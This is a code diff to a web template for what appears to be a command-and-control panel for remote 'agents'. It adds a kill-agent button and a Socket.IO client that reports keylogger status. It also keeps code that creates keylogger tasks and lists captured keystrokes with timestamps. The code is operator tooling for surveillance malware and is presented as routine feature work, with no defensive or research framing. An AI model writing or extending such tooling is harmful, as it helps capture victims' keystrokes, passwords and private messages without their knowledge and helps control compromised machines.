@@ -339,7 +339,6 @@ document.addEventListener('DOMContentLoaded', function() {
                         throw new Error(data.message || 'Failed to create keylogger task');
                     }
                     alert(`Keylogger task (${action}) created successfully! Task ID: ${data.task_id}`);
-                    window.location.reload();
                 } catch (error) {
                     console.error('Error:', error);
                     alert(`Failed to create keylogger task: ${error.message}`);
@@ -505,8 +504,39 @@ document.addEventListener('DOMContentLoaded', function() {
     // Manual refresh
     document.getElementById('manualRefresh').addEventListener('click', refreshAgentDetail);
 
+    // Kill Agent button click handler
+    document.getElementById('killAgent').addEventListener('click', async function() {
+        if (!confirm('Are you sure you want to kill this agent?')) {
+            return;
+        }
+        try {
+            const response = await fetch('/api/kill_agent', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    agent_id: "{{ agent.id }}"
+                })
+            });
+            const data = await response.json();
+            if (!response.ok || data.status !== 'success') {
+                throw new Error(data.message || 'Failed to kill agent');
+            }
+            alert('Agent killed successfully.');
+            window.location.reload();
+        } catch (error) {
+            console.error('Error killing agent:', error);
+            alert(`Failed to kill agent: ${error.message}`);
+        }
+    });
+
     // Auto-refresh every 5 seconds
     setInterval(refreshAgentDetail, 5000);
+
+    // Track keylogger status updated by websocket events
+    let keyloggerStatus = 'unknown';
 
     // Fetch and update keylogger logs and status every 10 seconds
     async function fetchKeyloggerLogs() {
@@ -518,12 +548,10 @@ document.addEventListener('DOMContentLoaded', function() {
             });
             const data = await response.json();
             const logsContainer = document.getElementById('keyloggerLogs');
-            const statusBadge = document.getElementById('keyloggerStatusBadge');
+            console.log('fetchKeyloggerLogs: keyloggerStatus =', keyloggerStatus);
             if (data.status === 'success' && data.logs) {
                 if (data.logs.length === 0) {
                     logsContainer.innerHTML = '<li class="list-group-item text-muted">No keylogger logs available</li>';
-                    statusBadge.textContent = 'Keylogger Status: Inactive';
-                    statusBadge.className = 'badge bg-danger';
                 } else {
                     logsContainer.innerHTML = '';
                     data.logs.forEach(log => {
@@ -532,27 +560,66 @@ document.addEventListener('DOMContentLoaded', function() {
                         logItem.textContent = `[${log.timestamp}] ${log.keys}`;
                         logsContainer.appendChild(logItem);
                     });
-                    statusBadge.textContent = 'Keylogger Status: Active';
-                    statusBadge.className = 'badge bg-success';
                 }
             } else {
                 logsContainer.innerHTML = '<li class="list-group-item text-danger">Failed to load keylogger logs</li>';
-                statusBadge.textContent = 'Keylogger Status: Unknown';
-                statusBadge.className = 'badge bg-secondary';
             }
         } catch (error) {
             console.error('Error fetching keylogger logs:', error);
             const logsContainer = document.getElementById('keyloggerLogs');
             logsContainer.innerHTML = '<li class="list-group-item text-danger">Error loading keylogger logs</li>';
-            const statusBadge = document.getElementById('keyloggerStatusBadge');
-            statusBadge.textContent = 'Keylogger Status: Error';
-            statusBadge.className = 'badge bg-danger';
         }
     }
 
     fetchKeyloggerLogs();
     setInterval(fetchKeyloggerLogs, 10000);
+
+    // New websocket client for keylogger status updates
+    const socket = io("{{ request.url_root }}keylogger", { reconnection: false });
+
+    socket.on('connect', () => {
+        console.log('Connected to keylogger websocket namespace');
+        // Join the room for this agent to receive targeted events
+        socket.emit('join', 'agent_{{ agent.id }}');
+    });
+
+    socket.on('agent_connected', (data) => {
+        console.log('Received agent_connected event:', data);
+        if (data.status === 'success') {
+            const statusBadge = document.getElementById('keyloggerStatusBadge');
+            statusBadge.textContent = 'Keylogger Status: Active';
+            statusBadge.className = 'badge bg-success';
+        }
+    });
+
+    socket.on('keylogger_status', (data) => {
+        console.log('Received keylogger_status event:', data);
+        const statusBadge = document.getElementById('keyloggerStatusBadge');
+        console.log('Before update: keyloggerStatus =', keyloggerStatus, ', badge text =', statusBadge.textContent);
+        if (data.status === 'stopped') {
+            statusBadge.textContent = 'Keylogger Status: Inactive';
+            statusBadge.className = 'badge bg-danger';
+            keyloggerStatus = 'stopped';
+        } else if (data.status === 'started') {
+            statusBadge.textContent = 'Keylogger Status: Active';
+            statusBadge.className = 'badge bg-success';
+            keyloggerStatus = 'active';
+        } else {
+            statusBadge.textContent = `Keylogger Status: ${data.status}`;
+            statusBadge.className = 'badge bg-secondary';
+            keyloggerStatus = 'unknown';
+        }
+        console.log('After update: keyloggerStatus =', keyloggerStatus, ', badge text =', statusBadge.textContent);
+    });
+
+    socket.on('disconnect', (reason) => {
+        console.log('Keylogger websocket disconnected:', reason);
+        const statusBadge = document.getElementById('keyloggerStatusBadge');
+        console.log('Disconnect event fired, updating badge to Inactive');
+        statusBadge.textContent = 'Keylogger Status: Inactive';
+        statusBadge.className = 'badge bg-danger';
+    });
+
 });
 </script>
 {% endblock %}
-</create_file>
